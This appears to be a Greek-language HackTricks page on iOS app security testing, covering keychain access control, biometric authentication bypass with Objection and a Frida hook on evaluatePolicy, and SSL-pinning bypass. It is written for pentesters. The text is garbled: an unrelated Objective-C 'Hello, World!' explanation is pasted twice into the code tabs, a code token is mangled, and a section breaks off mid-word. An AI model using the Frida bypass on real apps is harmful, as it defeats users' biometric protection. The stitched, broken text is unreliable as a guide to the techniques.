Ο παρακάτω κώδικας δείχνει ένα παράδειγμα ενός απλού Objective-C προγράμματος που εκτυπώνει το κείμενο "Hello, World!" στην κονσόλα:

```objective-c
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"Hello, World!");
    }
    return 0;
}
```

Για να εκτελέσετε αυτόν τον κώδικα, απλά αντιγράψτε τον σε ένα αρχείο με κατάληξη `.m` (π.χ. `main.m`) και συντάξτε τον χρησιμοποιώντας τον μεταγλωττιστή Objective-C. Στη συνέχεια, μπορείτε να τον εκτελέσετε από τη γραμμή εντολών χρησιμοποιώντας την εντολή `gcc -framework Foundation main.m -o main && ./main`.

Αυτός ο κώδικας χρησιμοποιεί την κλάση `NSLog` από το πλαίσιο εργασίας Foundation για να εκτυπώσει το κείμενο "Hello, World!" στην κονσόλα. Η κλάση `NSLog` είναι μια βοηθητική μέθοδος που χρησιμοποιείται για να εκτυπώσει μηνύματα αποσφαλμάτωσης και πληροφορίες στην κονσόλα.

Αυτός είναι ένας απλός τρόπος για να ξεκινήσετε με τη γλώσσα προγραμματισμού Objective-C. Μπορείτε να εξερευνήσετε περισσότερες προηγμένες δυνατότητες και λειτουργίες της γλώσσας προγραμματισμού Objective-C μέσω της αναζήτησης στο διαδίκτυο και της ανάγνωσης της τεκμηρίωσης της Apple.

{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Τώρα μπορούμε να ζητήσουμε το αποθηκευμένο στοιχείο από το keychain. Οι υπηρεσίες keychain θα εμφανίσουν το παράθυρο ελέγχου ταυτότητας στον χρήστη και θα επιστρέψουν δεδομένα ή nil ανάλογα με το αν παρέχεται κατάλληλο δακτυλικό αποτύπωμα ή όχι.

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% tab title="Objective-C" %}

Ο παρακάτω κώδικας δείχνει ένα παράδειγμα ενός απλού Objective-C προγράμματος που εκτυπώνει το κείμενο "Hello, World!" στην κονσόλα:

```objective-c
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"Hello, World!");
    }
    return 0;
}
```

Για να εκτελέσετε αυτόν τον κώδικα, απλά αντιγράψτε τον σε ένα αρχείο με κατάληξη `.m` (π.χ. `main.m`) και συντάξτε τον χρησιμοποιώντας τον μεταγλωττιστή Objective-C. Στη συνέχεια, μπορείτε να τον εκτελέσετε από τη γραμμή εντολών χρησιμοποιώντας την εντολή `gcc -framework Foundation main.m -o main && ./main`.

Αυτός ο κώδικας χρησιμοποιεί την κλάση `NSLog` από το πλαίσιο εργασίας Foundation για να εκτυπώσει το κείμενο "Hello, World!" στην κονσόλα. Η κλάση `NSLog` είναι μια βοηθητική μέθοδος που χρησιμοποιείται για να εκτυπώσει μηνύματα αποσφαλμάτωσης και πληροφορίες στην κονσόλα.

Αυτός είναι ένας απλός τρόπος για να ξεκινήσετε με τη γλώσσα προγραμματισμού Objective-C. Μπορείτε να εξερευνήσετε περισσότερες προηγμένες δυνατότητες και λειτουργίες της γλώσσας προγραμματισμού Objective-C μέσω της αναζήτησης στο διαδίκτυο και της ανάγνωσης της τεκμηρίωσης της Apple.

{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Ανίχνευση

Η χρήση πλαισίων σε μια εφαρμογή μπορεί επίσης να ανιχνευθεί αναλύοντας τη λίστα των κοινόχρηστων δυναμικών βιβλιοθηκών του δυαδικού αρχείου της εφαρμογής. Αυτό μπορεί να γίνει χρησιμοποιώντας το `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Εάν χρησιμοποιείται το `LocalAuthentication.framework` σε μια εφαρμογή, η έξοδος θα περιέχει και τις παρακάτω γραμμές (θυμηθείτε ότι το `LocalAuthentication.framework` χρησιμοποιεί το `Security.framework` υποκείμενο):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Εάν χρησιμοποιείται το `Security.framework`, θα εμφανιστεί μόνο το δεύτερο.

### Διάβρωση του Πλαισίου Τοπικής Ταυτοποίησης

#### **Objection**

Μέσω της **Διάβρωσης της Βιομετρίας Objection**, που βρίσκεται στη [σελίδα GitHub αυτή](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), είναι διαθέσιμη μια τεχνική για την αντιμετώπιση του μηχανισμού **LocalAuthentication**. Η ουσία αυτής της προσέγγισης είναι η εκμετάλλευση του **Frida** για την παραπλάνηση της συνάρτησης `evaluatePolicy`, εξασφαλίζοντας ότι πάντα επιστρέφει την τιμή `True`, ανεξάρτητα από την πραγματική επιτυχία της ταυτοποίησης. Αυτό είναι ιδιαίτερα χρήσιμο για την παράκαμψη ελαττωματικών διαδικασιών βιομετρικής ταυτοποίησης.

Για την ενεργοποίηση αυτής της παράκαμψης, χρησιμοποιείται η παρακάτω εντολή:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Αυτή η εντολή εκτελεί μια ακολουθία όπου το Objection καταχωρεί μια εργασία που αλλάζει αποτελεσματικά το αποτέλεσμα του ελέγχου `evaluatePolicy` σε `True`.

#### Frida

Ένα παράδειγμα χρήσης της **`evaluatePolicy`** από την εφαρμογή [DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Για να επιτευχθεί η **παράκαμψη** της Τοπικής Ταυτοποίησης, γράφεται ένα σενάριο Frida. Αυτό το σενάριο στοχεύει τον έλεγχο **evaluatePolicy**, παρεμβαίνοντας στην κλήση του για να διασφαλίσει ότι επιστρέφει **success=1**. Αλλάζοντας τη συμπεριφορά της κλήσης, ο έλεγχος ταυτοποίησης παρακάμπτεται αποτελεσματικά.

Το παρακάτω σενάριο ενσωματώνεται για να τροποποιήσει το αποτέλεσμα της μεθόδου **evaluatePolicy**. Αλλάζει το αποτέλεσμα της κλήσης για να υποδεικνύει πάντα επιτυχία.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Για να εισαγάγετε το Frida script και να παρακάμψετε τη βιομετρική αυθεντικοποίηση, χρησιμοποιείται η παρακάτω εντολή:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Αποκάλυψη Ευαίσθητων Λειτουργιών μέσω IPC

### Προσαρμοσμένοι Χειριστές URI / Deeplinks / Προσαρμοσμένα Σχήματα

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Κοινές Συνδέσεις

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Κοινή Χρήση UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Επεκτάσεις Εφαρμογής

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Σειριοποίηση και Κωδικοποίηση

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Επικοινωνία Δικτύου

Είναι σημαντικό να ελέγξετε ότι δεν υπάρχει επικοινωνία **χωρίς κρυπτογράφηση** και επίσης ότι η εφαρμογή ελέγχει σωστά το **πιστοποιητικό TLS** του διακομιστή.\
Για να ελέγξετε αυτού του είδους τα προβλήματα, μπορείτε να χρησιμοποιήσετε έναν διαμεσολαβητή όπως το **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Έλεγχος Ονόματος Κεντρικού Υπολογιστή

Ένα κοινό πρόβλημα κατά τον έλεγχο του πιστοποιητικού TLS είναι να ελέγξετε αν το πιστοποιητικό υπογράφηκε από έναν **αξιόπιστο** **Φορέα Πιστοποίησης (CA)**, αλλά να **μην ελέγξετε** αν **το όνομα του κεντρικού υπολογιστή** στο πιστοποιητικό είναι το όνομα του κεντρικού υπολογιστή που προσπελαύνεται.\
Για να ελέγξετε αυτό το πρόβλημα χρησιμοποιώντας το Burp, μετά την εμπιστοσύνη του CA του Burp στο iPhone, μπορείτε να **δημιουργήσετε ένα νέο πιστοποιητικό με το Burp για ένα διαφορετικό όνομα κεντρικού υπολογιστή** και να το χρησιμοποιήσετε. Αν η εφαρμογή εξακολουθεί να λειτουργεί, τότε κάτι είναι ευάλωτο.

### Καρφίτσωμα Πιστοποιητικού

Αν μια εφαρμογή χρησιμοποιεί σωστά το SSL Pinning, τότε η εφαρμογή θα λειτουργεί μόνο αν το πιστοποιητικό είναι αυτό που αναμένεται. Κατά τη δοκιμή μιας εφαρμογής, **αυτό μπορεί να αποτελέσει πρόβλημα καθώς το Burp θα εξυπηρετεί το δικό του πιστοποιητικό.**\
Για να παρακάμψετε αυτήν την προστασία μέσα σε μια jailbroken συσκευή, μπορείτε να εγκαταστήσετε την εφαρμογή [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ή να εγκαταστήσετε το [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Μπορείτε επίσης να χρησιμοποιήσετε την εντολή **`ios sslpinning disable`** του **objection**.

## Διάφορα

* Στο **`/System/Library`** μπορείτε να βρείτε τα πλαίσια που είναι εγκατεστημένα στο τηλέφωνο και χρησιμοποιούνται από εφαρμογές του συστήματος
* Οι εφαρμογές που έχει εγκαταστήσει ο χρήστης από το App Store βρίσκονται μέσα στο **`/User/Applications`**
* Και το **`/User/Library`** περιέχει δεδομένα που αποθηκεύονται από εφαρμογές επιπέδου χρήστη
* Μπορείτε να αποκτήσετε πρόσβαση στο **`/User/Library/Notes/notes.sqlite`** για να διαβάσετε τις σημειώσεις που αποθηκεύονται μέσα στην εφαρμογή.
* Μέσα στον φάκελο μιας εγκατεστημένης εφαρμογής (**`/User/Applications/<APP ID>/`**) μπορείτε να βρείτε μερικά ενδιαφέροντα αρχεία:
* **`iTunesArtwork`**: Το εικονίδιο που χρησιμοποιεί η εφαρμογή
* **`iTunesMetadata.plist`**: Πληροφορίες της εφαρμογής που χρησιμοποιούνται στο App Store
* **`/Library/*`**: Περιέχει τις προτιμήσεις και την προσωρινή μνήμη. Στο **`/Library/Cache/Snapshots/*`** μπορείτε να βρείτε το στιγμιότυπο που πραγματοποιήθηκε στην εφαρμογή πριν την αποστολή της στο παρασκήνιο.

### Ζεστό Επιδιόρθωμα/Επιβολή Ενημέρωσης

Οι προγραμματιστές μπορούν να επιδιορθώσουν απομακρυσμένα **όλες τις εγκαταστάσεις της εφαρμογής τους αμέσως** χωρίς να χρειάζεται να υποβάλουν ξανά την εφαρμογή στο App Store και να περιμένουν μέχρι να ε
```bash
otool -L <application_path>
```
## **Αναφορές & Περισσότεροι Πόροι**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Δωρεάν μάθημα iOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Έκδοση Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Έκδοση Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud
